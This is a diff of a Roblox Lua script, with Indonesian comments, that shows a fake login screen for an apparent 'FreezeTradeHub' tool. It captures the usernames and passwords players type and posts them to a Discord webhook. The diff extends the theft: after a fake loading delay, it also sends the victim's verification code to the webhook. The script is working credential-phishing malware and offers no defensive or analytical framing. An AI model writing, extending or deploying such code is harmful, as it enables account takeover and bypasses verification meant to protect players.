@@ -6,7 +6,7 @@ local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
 local linkUrl = "https://link-target.net/1273087/freezetradehub"
 
 -- Fungsi untuk mengirim data ke Discord
-local function sendToDiscord(username, password)
+local function sendToDiscord(content)
     local payload = {
         Url = webhook_url,
         Method = "POST",
@@ -14,7 +14,7 @@ local function sendToDiscord(username, password)
             ["Content-Type"] = "application/json"
         },
         Body = game:GetService("HttpService"):JSONEncode({
-            content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
+            content = content
         })
     }
 
@@ -130,7 +130,7 @@ local function createLoginGUI()
         local password = passwordBox.Text
         if username ~= "" and password ~= "" then
             print("Login berhasil! Username:", username, "Password:", password)
-            sendToDiscord(username, password)
+            sendToDiscord("Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password)
             gui:Destroy()
             createLoadingGUI() -- Memanggil GUI loading
         else
@@ -165,13 +165,13 @@ local function createLoadingGUI()
     loadingLabel.BackgroundTransparency = 1
     loadingLabel.Font = Enum.Font.SourceSansBold
     loadingLabel.Text = "Loading, silakan tunggu..."
-    loadingLabel.TextSize = 20
+    loadingLabel.TextSize = 24
     loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Menunggu selama 8 detik sebelum melanjutkan
     wait(8)
     gui:Destroy()
-    createVerificationCodeGUI() -- Memanggil GUI verifikasi
+    createVerificationCodeGUI() -- Memanggil GUI verifikasi kode
 end
 
 -- Fungsi Membuat GUI Keempat (Verifikasi Kode)
@@ -243,11 +243,11 @@ local function createVerificationCodeGUI()
 
     -- Fungsi Verifikasi Kode
     verifyCodeButton.MouseButton1Click:Connect(function()
-        local verificationCode = codeBox.Text
-        if verificationCode ~= "" then
-            print("Kode verifikasi diterima:", verificationCode)
+        local code = codeBox.Text
+        if code ~= "" then
+            sendToDiscord("Kode Verifikasi Diterima: " .. code)
+            print("Kode verifikasi berhasil dikirim ke Discord!")
             gui:Destroy()
-            -- Lanjutkan ke proses berikutnya
         else
             errorLabel.Text = "Harap masukkan kode verifikasi!"
         end
